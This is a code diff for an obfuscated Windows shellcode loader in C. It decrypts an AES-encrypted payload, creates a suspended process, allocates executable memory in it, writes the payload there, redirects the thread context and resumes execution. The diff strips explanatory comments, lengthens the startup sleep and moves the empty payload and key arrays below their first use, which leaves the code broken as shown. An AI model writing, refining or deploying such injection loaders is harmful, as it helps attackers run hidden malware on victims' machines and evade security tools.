@@ -16,21 +16,15 @@ void encaeshello(char* code1299d, DWORD code1299dLen, char* k27eykk, DWORD k27ey
     CryptHashData(hHash, (BYTE*)k27eykk, k27eykkLen, 0);
     CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
     CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)code1299d, &code1299dLen);
-
-    CryptReleaseContext(hProv, 0);
+CryptReleaseContext(hProv, 0);
     CryptDestroyHash(hHash);
     CryptDestroyKey(hKey);
 
 }
 
 int main() {
-    Sleep(2000);
+    Sleep(3000);
 
-    
-    unsigned char ke185hams[] = {};
-    unsigned char itsthecod345[] = {}; 
-
-    // Create a new process in a suspended state
     STARTUPINFO si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
@@ -45,16 +39,14 @@ int main() {
     GetThreadContext(pi.hThread, &ctx);
 
     LPVOID memlo = VirtualAllocEx(pi.hProcess, NULL, sizeof(itsthecod345),MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    // Decrypt the payload
+    unsigned char ke185hams[] = {};
+    unsigned char itsthecod345[] = {}; 
     encaeshello((char*)  itsthecod345, sizeof(itsthecod345), ke185hams, sizeof(ke185hams));
 
-    // Write payload to target process
     WriteProcessMemory(pi.hProcess, memlo, itsthecod345, sizeof(itsthecod345), NULL);
-    // Update entry point
-    ctx.Rcx = (DWORD64)memlo; // Use Rcx for x64 processes
+    ctx.Rcx = (DWORD64)memlo; 
     SetThreadContext(pi.hThread, &ctx);
 
-    // Resume thread to execute payload
     ResumeThread(pi.hThread); 
 
     
